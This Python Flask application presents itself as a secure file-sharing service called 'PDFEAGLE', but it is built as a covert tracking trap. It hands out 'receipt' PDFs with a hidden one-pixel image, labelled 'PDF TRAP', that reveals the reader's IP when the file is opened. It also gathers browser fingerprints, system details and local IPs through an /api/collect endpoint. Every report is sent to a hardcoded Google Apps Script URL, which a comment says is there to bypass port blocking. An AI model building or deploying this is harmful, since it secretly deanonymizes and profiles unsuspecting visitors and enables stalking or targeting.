import os
import json
import threading
import uuid
import datetime
import requests  # Нужно для отправки на Google Script
from flask import Flask, render_template, request, redirect, url_for, jsonify, send_from_directory, make_response, abort
from werkzeug.utils import secure_filename
from fpdf import FPDF

app = Flask(__name__)

# --- КОНФИГУРАЦИЯ ---
UPLOAD_FOLDER = '/tmp/uploads' if os.environ.get('RENDER') else 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'doc', 'docx', 'jpg', 'png'}

# --- НАСТРОЙКИ ОТПРАВКИ (GOOGLE SCRIPT) ---
# Твой скрипт для обхода блокировки портов
GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzR1L95FUkqS8X4OqcS0bBBqIGCdD4YfW7yCa5diOxnLeKvxnP1ONl-zGcezeEOLKLDOA/exec"

# База данных в памяти
db = {}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# --- ОТПРАВКА ОТЧЕТА (ЧЕРЕЗ GOOGLE SCRIPT) ---
def send_email_background(data, user_ip, user_agent, trigger_type="Page Load"):
    try:
        # Формируем красивый JSON для скрипта
        payload = {
            "trigger": trigger_type,
            "ip": user_ip,
            "user_agent": user_agent,
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "details": data # Полный дамп данных (fingerprint, system и т.д.)
        }
        
        # Отправляем POST запрос (Render разрешает порт 443)
        requests.post(GOOGLE_SCRIPT_URL, json=payload)
        print(f"[+] Report sent to Google Script: {trigger_type}")
        
    except Exception as e:
        print(f"[-] Google Script Error: {e}")

# --- PDF TRAP GENERATOR ---
class PDFReceipt(FPDF):
    def header(self):
        self.set_font('Arial', 'B', 15)
        self.cell(0, 10, 'PDFEAGLE - Secure Receipt', 0, 1, 'C')

def generate_receipt(uid, filename):
    pdf = PDFReceipt()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt=f"File: {filename}", ln=1)
    pdf.cell(200, 10, txt=f"Transaction ID: {uid}", ln=1)
    pdf.cell(200, 10, txt=f"Timestamp: {datetime.datetime.now()}", ln=1)
    pdf.cell(200, 10, txt="Status: Verified & Scanned", ln=1)
    
    tracking_url = f"https://pdfeagle.onrender.com/pixel.gif?source=pdf_receipt&uid={uid}"
    try:
        pdf.image(tracking_url, x=10, y=100, w=1, h=1)
    except:
        pass
    
    # Сохраняем квитанцию тоже с безопасным именем
    receipt_name = f"receipt_{uid}.pdf"
    path = os.path.join(app.config['UPLOAD_FOLDER'], receipt_name)
    pdf.output(path)
    return receipt_name

# --- МАРШРУТЫ ---

@app.route('/health')
def health_check():
    return "OK", 200

@app.route('/pixel.gif')
def tracking_pixel():
    source = request.args.get('source', 'unknown')
    uid = request.args.get('uid', 'unknown')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if source == 'pdf_receipt':
        data = {
            'meta': {'url': f'PDF TRAP ({uid})'},
            'system': {'platform': 'PDF Reader Application'},
            'fingerprint': {'webgl_renderer': 'N/A'},
            'network': {'localIPs': ['Unknown']}
        }
        threading.Thread(target=send_email_background, args=(data, ip, "PDF Reader", "PDF TRAP TRIGGERED")).start()

    return make_response(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b', 200, {'Content-Type': 'image/gif'})

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        if 'files' not in request.files: return redirect(request.url)
        files = request.files.getlist('files')
        uploaded_files = []
        
        for file in files:
            if file and allowed_file(file.filename):
                # 1. Получаем оригинальное имя и расширение БЕЗОПАСНО
                original_filename = file.filename
                try:
                    ext = original_filename.rsplit('.', 1)[1].lower()
                except IndexError:
                    ext = "bin" # Если файл без расширения
                
                # 2. Генерируем уникальное имя для диска (чтобы не было проблем с кириллицей)
                saved_filename = f"{uuid.uuid4().hex}.{ext}"
                
                # 3. Сохраняем файл
                file.save(os.path.join(app.config['UPLOAD_FOLDER'], saved_filename))
                
                icon = "fa-file-pdf" if ext == 'pdf' else "fa-file-word" if ext in ['doc', 'docx'] else "fa-file-alt"
                
                # 4. Записываем связь: Реальное имя <-> Имя на диске
                uploaded_files.append({
                    'name': original_filename,      # Показываем юзеру "Отчет.pdf"
                    'saved_name': saved_filename,   # На диске лежит "a1b2... .pdf"
                    'format': ext.upper(), 
                    'icon': icon, 
                    'date': datetime.datetime.now().strftime("%d.%m.%Y %H:%M")
                })

        if uploaded_files:
            unique_id = uuid.uuid4().hex[:6]
            db[unique_id] = {'files': uploaded_files, 'created_at': datetime.datetime.now()}
            return redirect(f"/{unique_id}")
            
    return render_template('index.html')

@app.route('/<unique_id>')
def view_files(unique_id):
    data = db.get(unique_id)
    if not data: return "File not found or expired", 404
    return render_template('view.html', files=data['files'], uid=unique_id)

@app.route('/download/<uid>/<path:filename>')
def download_file(uid, filename):
    """
    filename здесь - это то, что запрашивает браузер (оригинальное имя).
    Нам нужно найти соответствующий saved_name.
    """
    data = db.get(uid)
    if not data: return abort(404)
    
    # Ищем файл в базе по оригинальному имени
    target_file = next((f for f in data['files'] if f['name'] == filename), None)
    
    if target_file:
        # Отдаем файл с диска (saved_name), но браузеру говорим сохранить как (name)
        return send_from_directory(
            app.config['UPLOAD_FOLDER'], 
            target_file['saved_name'], 
            as_attachment=True, 
            download_name=target_file['name']
        )
    
    return abort(404)

@app.route('/download_receipt/<uid>')
def download_receipt(uid):
    filename = generate_receipt(uid, "Secure_Download")
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route('/api/collect', methods=['POST'])
def collect_data():
    data = request.json
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    trigger = data.get('meta', {}).get('trigger', 'Page Load')
    
    threading.Thread(target=send_email_background, args=(data, user_ip, user_agent, trigger)).start()
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
